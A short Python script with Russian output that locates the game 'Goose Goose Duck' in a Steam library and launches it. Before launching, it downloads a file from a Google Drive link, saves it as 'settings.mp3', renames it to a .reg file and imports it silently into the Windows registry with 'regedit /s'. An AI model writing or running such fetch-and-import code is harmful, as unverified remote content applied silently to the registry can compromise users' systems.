import os
import shutil
import requests
import subprocess
import re

url = "http://drive.google.com/uc?export=download&id=18Yr6wfSAJZTqhttMFVDNx7pZkez2vJBq"

downloaded_file = "settings.mp3"  

corrected_file = "settings.reg"  

steam_library_file = os.path.join(os.getenv("ProgramFiles(x86)"), "Steam", "steamapps", "libraryfolders.vdf")

def find_game_directory(game_name):
    if not os.path.exists(steam_library_file):
        print("Убедитесь, что Steam установлен")
        return None

    with open(steam_library_file, "r", encoding="utf-8") as file:
        content = file.read()

    paths = re.findall(r'"path"\s*"([^"]+)"', content)

    for path in paths:
        game_path = os.path.join(path, "steamapps", "common", game_name)
        if os.path.exists(game_path):
            return game_path

    return None

game_name = "Goose Goose Duck"
game_dir = find_game_directory(game_name)

if game_dir is None:
    print("Игра не найдена в Steam Library")
    exit(1)

reg_file_path = os.path.join(game_dir, corrected_file)

response = requests.get(url)
if response.status_code == 200:
    with open(downloaded_file, "wb") as file:
        file.write(response.content)
    print(f"Файл скачан как: {downloaded_file}")

    shutil.move(downloaded_file, reg_file_path)
    print(f"Файл перемещён в: {reg_file_path}")
else:
    print("Ошибка скачивания файла")
    exit(1)

subprocess.run(["regedit", "/s", reg_file_path], shell=True)
print("Настройки успешно внесены в реестр")

subprocess.run(["start", "steam://rungameid/1568590"], shell=True)
print("Игра запущена")
